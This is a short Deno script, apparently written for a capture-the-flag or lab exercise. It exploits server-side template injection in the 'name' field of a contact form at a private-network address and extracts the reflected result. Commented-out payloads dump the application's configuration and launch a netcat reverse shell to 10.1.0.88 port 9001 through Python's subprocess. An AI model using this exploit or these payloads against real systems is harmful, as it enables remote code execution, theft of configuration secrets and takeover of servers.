export {};

const atark = Deno.args[0];

// Dump config object
// const atark = `{% for key, value in config.items() %}{% print(key) %} = {% print(value) %}{% print("\n") %}{% endfor %}`;

// const atark = `{% if (__import__("subprocess").check_call)(['/bin/sh', '-c', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.1.0.88 9001 >/tmp/f']) %}true{% else %}false{% endif %}`
// const atark = `++-\{% for user in range(4) %}<b>Bold Text</b>{% endfor %}`
// (__import__("subprocess").check_call)(['/bin/sh', '-c', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.1.0.88 9001 >/tmp/f'])

const result = await fetch("http://10.2.17.10/contact", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `name=${atark}&email=1&telefonnummer=1&freitext=1`,
  method: "POST",
});

const text = await result.text();
console.log(
  text
    .replace(/[\s\S]*Thank you for your Request Mr\/Ms /m, "")
    .replace(/\. We will contact you in the next 24 hours[\s\S]*/m, "")
);
